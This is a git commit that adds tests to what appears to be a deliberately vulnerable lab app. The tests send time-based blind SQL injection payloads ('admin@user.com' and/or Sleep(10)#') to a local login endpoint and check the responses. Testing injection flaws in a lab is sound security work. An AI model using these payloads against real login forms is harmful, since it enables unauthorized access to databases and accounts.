1930a9659aab60542c62be9dfcbbbbdee4e25206
Shannon McHale <46467306+Littlehack3r@users.noreply.github.com>
2019-11-23 22:13:32 -0500

    Update test_act5.py

--- tests/test_act5.py
+++ tests/test_act5.py
@@ -16,5 +16,35 @@ def test_classic_sql():
     print(text)
     assert "GZDxKjvdZUA5u4tP" in text
 
+def test_blind_sql_false():
+    """
+    Blind Sql injection Test
+    """
+    classic = requests.post("http://localhost:5000/login", {"username": "admin@user.com\' and Sleep(10)#", "password": ""}).text
+    soup = BeautifulSoup(classic, "html.parser")
+    text=soup.find_all(text=True)
+    string = ""
+    for x in text:
+        string += str(x)
+    text = string
+    print(text)
+    assert "No record" in text
+
+def test_blind_sql_true():
+    """
+    Blind Sql injection Test
+    """
+    classic = requests.post("http://localhost:5000/login", {"username": "admin@user.com\' or Sleep(10)#", "password": ""}).text
+    soup = BeautifulSoup(classic, "html.parser")
+    text=soup.find_all(text=True)
+    string = ""
+    for x in text:
+        string += str(x)
+    text = string
+    print(text)
+    assert "password" in text
+
 if __name__ == '__main__':
     test_classic_sql()
+    test_blind_sql_true()
+    test_blind_sql_false()
